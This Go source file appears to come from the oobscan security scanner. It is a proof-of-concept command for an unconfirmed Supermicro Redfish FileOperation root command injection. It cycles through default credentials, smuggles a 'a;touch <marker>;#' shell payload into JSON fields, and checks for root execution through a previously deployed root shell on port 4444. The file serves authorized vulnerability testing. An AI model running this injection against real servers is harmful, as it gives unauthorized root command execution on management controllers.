package cmd

// SMC-0004 proof of concept. Supermicro did not reproduce this on matching
// hardware and no CVE was assigned.
//
// The Supermicro OEM Redfish FileOperation Import action interpolates the
// AuthToken, TransferProtocol and ImageURI JSON fields into a curl command run
// through system() as root, with no shell-metacharacter escaping. This command
// injects a marker payload into one of those fields, then confirms root
// execution through the smc-restore-shell certificate-authenticated root shell deployed by
// `oobscan smc-restore-shell --apply`.

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
	"github.com/runZeroInc/oobscan/pkg/redfish"
)

var (
	smc0004Creds      []string
	smc0004Confirm    bool
	smc0004MarkerPath string
	smc0004ShellPort  int
	smc0004ActionPath string
	smc0004Via        string // injection field: authtoken | transferprotocol | imageuri
	smc0004Timeout    time.Duration
)

// smc0004Marker builds a unique /tmp file name so a positive is never a stale
// artifact from an earlier run.
func smc0004Marker() (string, string) {
	if smc0004MarkerPath != "" {
		return smc0004MarkerPath, smc0004MarkerPath
	}
	var b [6]byte
	_, _ = rand.Read(b[:])
	name := "/tmp/smc0004_" + hex.EncodeToString(b[:])
	return name, name
}

// smc0004Payload renders the injection string for the chosen field. The # at
// the end comments out the trailing quote of the surrounding shell context.
// Injection goes into AuthToken by default because the advisory shows it lands
// first in the command template.
func smc0004Payload(marker string) string {
	inj := "a;touch " + marker + ";#"
	switch strings.ToLower(smc0004Via) {
	case "transferprotocol":
		return "http;" + inj
	case "imageuri":
		return "127.0.0.1;" + inj
	default:
		return inj
	}
}

// basicB64 encodes user:pass for an HTTP Basic Authorization header.
func basicB64(user, pass string) string {
	req, _ := http.NewRequest(http.MethodGet, "http://x/", nil)
	req.SetBasicAuth(user, pass)
	return strings.TrimPrefix(req.Header.Get("Authorization"), "Basic ")
}

var redfishFileOpCmd = &cobra.Command{
	Use:   "fileop [flags] <host>",
	Short: "SMC-0004: test the Supermicro FileOperation root command injection (vendor could not reproduce; no CVE).",
	Long: `fileop tests SMC-0004: the Supermicro OEM Redfish
FileOperation Import action interpolates the AuthToken, TransferProtocol and
ImageURI JSON fields into a curl command line that run_shellcmd passes to
system() as root, with no shell-metacharacter escaping (0x180 byte bound).

The marker payload "a;touch <marker>;#" is injected into --via (AuthToken by
default) and the action POSTed with credentials from --cred (repeatable; each
is tried user:pass, and every host:port combination is probed until one
authenticates). Because the sink is blind, confirmation runs out of band:
without --confirm the command stops at reporting the HTTP result; with
--confirm it reads the marker back through the smc-restore-shell certificate-authenticated
root shell deployed by 'oobscan smc-restore-shell --apply' (listening on
--shell-port, default 4444), and the marker's presence as uid 0 is the proof.

Status: Supermicro did not reproduce this on matching hardware and no CVE was
assigned. The runZero Lights Out post lists it as an unreproduced lead
(https://www.runzero.com/blog/lights-out-exposed/#unreproducable-supermicro-findings).

This attempts to execute an OS command on the target as root. Run only against
systems you are authorized to test. The payload creates a marker file with
touch(1), or updates its timestamps if it exists; arrange cleanup afterward.

Examples:

	oobscan redfish fileop --cred ADMIN:ADMIN --cred ADMIN:runZero2025! 10.114.122.41
	oobscan redfish fileop --cred ADMIN:ADMIN --confirm --shell-port 4444 10.114.122.41
	oobscan redfish fileop --cred ADMIN:runZero2025! --via imageuri --confirm 10.114.122.42`,
	Args: cobra.ExactArgs(1),
	RunE: runRedfishFileOp,
}

func runRedfishFileOp(cmd *cobra.Command, args []string) error {
	host := strings.TrimSpace(args[0])
	if host == "" {
		return fmt.Errorf("fileop: a host is required")
	}
	if len(smc0004Creds) == 0 {
		return fmt.Errorf("fileop: at least one --cred user:pass is required")
	}

	timeout := smc0004Timeout
	if timeout <= 0 {
		timeout = 15 * time.Second
	}
	client := redfish.InsecureClient(timeout)
	base := redfish.BaseURL(host, redfishPort)

	// Authenticate with each credential until one yields a usable admin session.
	var headers map[string]string
	var via, usedCred string
	for _, cred := range smc0004Creds {
		user, pass, ok := strings.Cut(cred, ":")
		if !ok {
			return fmt.Errorf("fileop: --cred %q is not user:pass", cred)
		}
		res := redfish.OpenSession(client, base, user, pass, timeout)
		if res.Authenticated && res.Token != "" {
			headers = map[string]string{"X-Auth-Token": res.Token}
			via = res.Via
			usedCred = user
			defer redfish.DeleteSession(client, base, res.SessionURI, res.Token, timeout)
			break
		}
		if res.Authenticated { // basic fallback: send Authorization per request
			headers = map[string]string{"Authorization": "Basic " + basicB64(user, pass)}
			via = res.Via
			usedCred = user
			break
		}
	}
	if headers == nil {
		return fmt.Errorf("fileop: no credential authenticated to %s (tried %d)", host, len(smc0004Creds))
	}
	fmt.Fprintf(cmd.OutOrStdout(), "[%s] authenticated as %s via %s\n", host, usedCred, via)

	marker, _ := smc0004Marker()
	// The Import template interpolates the fields as
	//   curl -H X-Auth-Token:<AuthToken> -sk <TransferProtocol>://<ImageURI> -o /tmp/import_file
	// so only AuthToken needs a leading dummy token; the other two fields need
	// their prefix kept intact for the URL to still parse.
	injection := smc0004Payload(marker)
	var authToken, transferProtocol, imageURI = "a", "http", "127.0.0.1"
	switch strings.ToLower(smc0004Via) {
	case "transferprotocol":
		transferProtocol = injection
	case "imageuri":
		imageURI = injection
	default:
		authToken = injection
	}
	res, err := redfish.PostFileOperation(client, base, smc0004ActionPath, headers,
		imageURI, transferProtocol, authToken, timeout)
	if err != nil {
		return fmt.Errorf("fileop: POST FileOperation: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[%s] FileOperation HTTP %d (marker %s)\n", host, res.Status, marker)

	out := map[string]any{
		"advisory":  "SMC-0004",
		"host":      host,
		"authUser":  usedCred,
		"authVia":   via,
		"via":       strings.ToLower(firstNonEmptyStr(smc0004Via, "authtoken")),
		"marker":    marker,
		"http":      res.Status,
		"accepted":  res.OK,
		"confirmed": false,
	}
	if !res.OK {
		printJSON(out)
		return fmt.Errorf("FileOperation returned HTTP %d", res.Status)
	}

	// Blind sink: prove the injected touch(1) ran as root by reading the marker
	// back over the deployed smc-restore-shell service.
	if cmd.Flags().Changed("confirm") {
		certPath := resolveSMCShellCertPath(smcCertPath)
		cert, cerr := readSMCShellClientCert(certPath)
		if cerr != nil {
			printJSON(out)
			return fmt.Errorf("fileop: --confirm needs the smc-restore-shell client cert: %w", cerr)
		}
		script := "test -f " + marker + " && echo CONFIRMED uid=$(id -u) || echo ABSENT"
		shellOut, serr := ipmi.SMCShellExec(host, smc0004ShellPort, cert, script, 30*time.Second)
		out["shellOutput"] = strings.TrimSpace(shellOut)
		if serr != nil {
			printJSON(out)
			return fmt.Errorf("fileop: injection accepted (HTTP %d) but shell confirmation failed: %w", res.Status, serr)
		}
		if strings.Contains(shellOut, "CONFIRMED") {
			out["confirmed"] = true
		}
	}
	printJSON(out)
	if c, _ := out["confirmed"].(bool); !c && cmd.Flags().Changed("confirm") {
		return fmt.Errorf("marker %s not found over the root shell; injection did not execute on this build", marker)
	}
	return nil
}

func init() {
	f := redfishFileOpCmd.Flags()
	f.StringArrayVar(&smc0004Creds, "cred", nil, "Redfish credential user:pass (repeatable; tried in order)")
	f.StringVar(&smc0004Via, "via", "authtoken", "injection field: authtoken|transferprotocol|imageuri")
	f.StringVar(&smc0004MarkerPath, "marker", "", "explicit marker path under /tmp (default: random smc0004_<hex>)")
	f.BoolVar(&smc0004Confirm, "confirm", false, "confirm root execution via the smc-restore-shell service")
	f.IntVar(&smc0004ShellPort, "shell-port", 4444, "TCP port of the deployed smc-restore-shell service")
	f.StringVar(&smc0004ActionPath, "action-path", redfish.FileOperationPath, "FileOperation action resource path")

	redfishCmd.AddCommand(redfishFileOpCmd)
}
